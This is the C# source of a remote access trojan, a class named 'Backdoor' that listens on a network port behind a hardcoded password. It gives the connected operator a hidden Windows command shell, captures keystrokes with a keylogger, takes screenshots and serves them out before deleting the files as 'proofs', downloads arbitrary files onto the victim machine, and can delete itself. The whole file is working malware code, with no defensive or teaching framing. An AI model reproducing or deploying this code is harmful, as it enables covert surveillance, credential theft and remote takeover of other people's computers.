using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using RAT;

namespace RAT
{
    public class Backdoor
    {
        TcpListener Listener;
        Socket Socket;
        StreamReader InStream;
        StreamWriter OutStream;
        Thread KeyloggerThread;
        KeyLogger Keylogger;

        int Port { get; set; }
        string Name { get; set; }
        string Password { get; set; }
        bool Verbose { get; set; }

        public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
        {
            this.Port = port;
            this.Name = serverName;
            this.Password = password;
            this.Verbose = verbose;
        }

        public void StartServer()
        {
            Console.Title = "RAT Server:" + Port;
            try
            {
                if (Verbose) Log("Listening on port " + Port);

                Listener = new TcpListener(IPAddress.Any, Port);
                Listener.Start(); // blocking call
                Socket = Listener.AcceptSocket();

                if (Verbose) Log("Client connected: " + Socket.RemoteEndPoint);

                Stream s = new NetworkStream(Socket);
                InStream = new StreamReader(s, Encoding.ASCII);
                OutStream = new StreamWriter(s, Encoding.ASCII);
                OutStream.AutoFlush = true;

                OutStream.WriteLine("Pswd:");
                string checkPass = InStream.ReadLine();

                if (Verbose) Log("Client tried password " + checkPass);
                if (!checkPass.Equals(Password))
                {
                    if (Verbose) Log("Incorrect Password");
                    DropConnection();
                    return;
                }
                if (Verbose) Log("Password Accepted.");

                // welcome message
                OutStream.WriteLine(StringExtensions.AlignCenter(String.Format("  Welcome to {0} RAT  ", Name), 80, '='));
                OutStream.WriteLine(StringExtensions.AlignCenter("  SINGLE-USER MODE  ", 80, '='));

                InputLoop();
            }
            catch (Exception e)
            {
                Log("<ERROR> Something happened:");
                Log(e.ToString());
            }
            finally
            {
                DropConnection();
            }
        }

        void InputLoop()
        {
            string tempBuff = "";
            while (((tempBuff = InStream.ReadLine()) != null))
            {
                if (Verbose) Log(">> " + tempBuff);
                HandleCommand(tempBuff);
            }
        }

        void HandleCommand(string command)
        {
            switch (command)
            {
                case RatAction.SHELL:
                    Process ShellProc = new Process();
                    ProcessStartInfo pInfo = new ProcessStartInfo("cmd")
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true
                    };
                    ShellProc.StartInfo = pInfo;

                    Thread ShellReaderThread = null;
                    StreamWriter ToShell = null;
                    StreamReader FromShell = null;
                    try
                    {
                        ShellProc.Start();
                        ToShell = ShellProc.StandardInput;
                        FromShell = ShellProc.StandardOutput;
                        ToShell.AutoFlush = true;

                        // start sending output to the user
                        ShellReaderThread = new Thread(delegate ()
                       {
                           string shellOutBuffer = "";
                           while ((shellOutBuffer = FromShell.ReadLine()) != null)
                           {
                               OutStream.WriteLine(shellOutBuffer + "\r");

                               // temporary, for logging
                               Console.ForegroundColor = ConsoleColor.Cyan;
                               Log(shellOutBuffer);
                               Console.ResetColor();
                           }
                           DropConnection();
                       });
                        ShellReaderThread.Start();
                        string buffer = "";
                        while (((buffer = InStream.ReadLine()) != null) && buffer != "q" && buffer != "exit")
                        {
                            ToShell.WriteLine(buffer + "\r\n");
                        }

                    }
                    catch (Exception e)
                    {
                        OutStream.WriteLine(e);
                        Log(e.ToString());
                    }
                    finally
                    {
                        if (ShellProc != null)
                        {
                            ShellProc.Close();
                            ShellProc.Dispose();
                        }
                        if (ShellReaderThread != null)
                        {
                            ShellReaderThread.Abort();
                            ShellReaderThread = null;
                        }
                        if (ToShell != null) ToShell.Dispose();
                        if (FromShell != null) FromShell.Dispose();
                        if (ShellProc != null) ShellProc.Dispose();
                        OutStream.WriteLine("==== Shell exited! ====");
                        if (Verbose) Log("Shell exit");
                    }
                    break;
                case RatAction.SCREENSHOT:
                    if (Verbose) OutStream.WriteLine("Taking a screenshot...");
                    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
                    WindowsHelper.MakeScreenshot(path);

                    Log("Image is hosted at port 2790");
                    OutStream.WriteLine("Image is hosted at port 2790");
                    HostImage(path);
                    Log("Image Sent < OK > !");
                    // delete all proofs
                    File.Delete(path);
                    Log("Image deleted");
                    if (Verbose) OutStream.WriteLine("Screenshot downloaded and deleted successfully!");
                    break;
                case RatAction.KEYLOGGER_START:
                    if (Keylogger != null)
                    {
                        Keylogger.StopAndDump();
                    }
                    Keylogger = new KeyLogger();
                    KeyloggerThread = new Thread(new ThreadStart(Keylogger.Start));
                    KeyloggerThread.Start();
                    break;
                case RatAction.KEYLOGGER_DUMP:
                    string dump = Keylogger.StopAndDump();
                    KeyloggerThread.Abort();
                    KeyloggerThread = null;
                    OutStream.WriteLine("Captured input:");
                    OutStream.WriteLine(dump);
                    break;
                case RatAction.SHOW_MESSAGE:
                    if (Verbose) Log("Show message mode");
                    OutStream.WriteLine("Title:");
                    string title = InStream.ReadLine();
                    OutStream.WriteLine("Content");
                    string content = InStream.ReadLine();

                    OutStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
                    string response = InStream.ReadLine();
                    if (response.Equals("y"))
                    {
                        OutStream.WriteLine("Message shown");
                        new Thread(delegate () { MessageBox.Show(content, title, MessageBoxButtons.OK); }).Start();
                        Log("Message shown");
                    }
                    else
                    {
                        Log("Message denied");
                        OutStream.WriteLine("MessageBox showing denied by the user");
                    }
                    break;
                case RatAction.DOWNLOAD_FILE:
                    if (Verbose) Log("File download mode");

                    OutStream.WriteLine("Enter URL of desired file to download:");
                    string url = InStream.ReadLine();
                    OutStream.WriteLine("FileName/Path on remote computer:");
                    string filePath = InStream.ReadLine();
                    try
                    {
                        using (var client = new WebClient())
                        {
                            client.DownloadFile(url, filePath);
                        }
                        OutStream.WriteLine("File downloaded successfully");
                        Log("File downloaded successfully");
                    }
                    catch (Exception e)
                    {
                        if (Verbose) Log("Exception during file download:");
                        OutStream.WriteLine("Exception during file download:" + e);
                        Log(e.ToString());
                    }

                    break;
                case RatAction.SELF_DELETE:
                    OutStream.WriteLine("Are you sure, that you want to delete the backdoor? [Y/N]");
                    var question = InStream.ReadLine();
                    if (question.Equals("y"))
                    {
                        Log("Performing self-deletion");
                        OutStream.WriteLine("Goodbye my friend!");
                        WindowsHelper.SelfDelete();
                        DropConnection();
                        Environment.Exit(0);
                    }
                    break;
                case RatAction.LIST_PROCESSES:
                    Log("LIST_PROCESSES MODE");
                    Process[] allProcesses = Process.GetProcesses();
                    foreach (Process process in allProcesses)
                    {
                        OutStream.WriteLine("#{0} \t{1} ", process.Id, process.ProcessName);
                    }
                    break;
                case RatAction.CHANGE_WALLPAPER:
                    OutStream.WriteLine("Enter the uri of new wallpaper:");
                    var uri = InStream.ReadLine();
                    try
                    {
                        WindowsHelper.Wallpaper.SetTo(new Uri(uri), WindowsHelper.Wallpaper.Style.Centered);
                        OutStream.WriteLine("\r\nWallpaper set!");
                        Log("Wallpaper set!");
                    }
                    catch (Exception e)
                    {
                        OutStream.WriteLine("Some error when setting wallpaper:\r\n" + e);
                        Log("<ERROR> when setting wallpaper:" + e);
                    }
                    break;
                case RatAction.QUIT:
                    OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                    DropConnection();
                    break;
                default:
                    OutStream.WriteLine("no such command. Try help commandfor more info");
                    break;
            }
        }

        void HostImage(string path)
        {
            string responseHeaders =
                "HTTP/1.1 200 OK\r\n" +
                "Server: google.com\r\n" +
                "Content-Length: " + new FileInfo(path).Length + "\r\n" +
                "Content-Type: image/png\r\n" +
                "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
                "\r\n";

            //headers should ALWAYS be ascii. Never UTF8
            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);

            var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
            lstr.Start();
            Log("Waiting for client to connect...");
            var webSocket = lstr.AcceptSocket();

            webSocket.Send(headerBytes);
            webSocket.SendFile(path);
            webSocket.Close();
            lstr.Stop();
        }

        public void DropConnection()
        {
            if (Verbose) Log("Dropping Connection");
            InStream.Dispose();
            OutStream.Dispose();
            Socket.Close();
            Listener.Stop();
        }

        string GenerateNLineBreaks(int n)
        {
            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < n; i++)
            {
                sb.Append("\r\n");
            }
            return sb.ToString();
        }

        void Log(string message)
        {
            Console.WriteLine(message);
        }
    }
}